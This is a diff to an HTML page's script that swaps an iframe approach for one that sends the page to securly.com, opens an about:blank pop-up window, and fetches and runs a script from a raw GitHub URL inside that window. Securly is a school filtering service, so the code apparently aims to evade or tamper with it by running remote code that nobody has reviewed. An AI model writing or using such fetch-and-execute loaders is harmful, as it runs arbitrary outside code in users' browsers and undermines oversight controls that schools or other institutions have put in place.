@@ -10,29 +10,29 @@
             const redirectUrl = 'https://securly.com';
             const scriptUrl = 'https://raw.githubusercontent.com/Dy1ngRat/pupet/refs/heads/main/action.js';
 
-            // Create an iframe
-            const iframe = document.createElement('iframe');
-            iframe.style.width = '100%';
-            iframe.style.height = '500px';
-            iframe.src = redirectUrl;
+            // Redirect to the new URL
+            window.location.href = redirectUrl;
 
-            document.body.appendChild(iframe);
+            // Open an about:blank window
+            const newWindow = window.open('about:blank', '_blank', 'width=500,height=300');
 
-            // Attempt to load script content into the iframe (requires same-origin policy compliance)
-            iframe.addEventListener('load', () => {
-                if (iframe.contentWindow && iframe.contentDocument) {
-                    fetch(scriptUrl)
-                        .then(response => response.text())
-                        .then(scriptContent => {
-                            const scriptElement = iframe.contentDocument.createElement('script');
-                            scriptElement.textContent = scriptContent;
-                            iframe.contentDocument.body.appendChild(scriptElement);
-                        })
-                        .catch(error => console.error('Error loading script:', error));
-                } else {
-                    console.warn('Cannot access iframe content. Cross-origin policy applies.');
-                }
-            });
+            // Ensure the new window is ready before injecting the script
+            if (newWindow) {
+                newWindow.document.write('<!DOCTYPE html><html lang="en"><head><title>Script Execution</title></head><body></body></html>');
+                newWindow.document.close();
+
+                // Fetch and execute the script in the new window
+                fetch(scriptUrl)
+                    .then(response => response.text())
+                    .then(scriptContent => {
+                        const scriptElement = newWindow.document.createElement('script');
+                        scriptElement.textContent = scriptContent;
+                        newWindow.document.body.appendChild(scriptElement);
+                    })
+                    .catch(error => console.error('Error loading script:', error));
+            } else {
+                console.error('Failed to open new window. Please allow pop-ups in your browser.');
+            }
         });
     </script>
 </head>
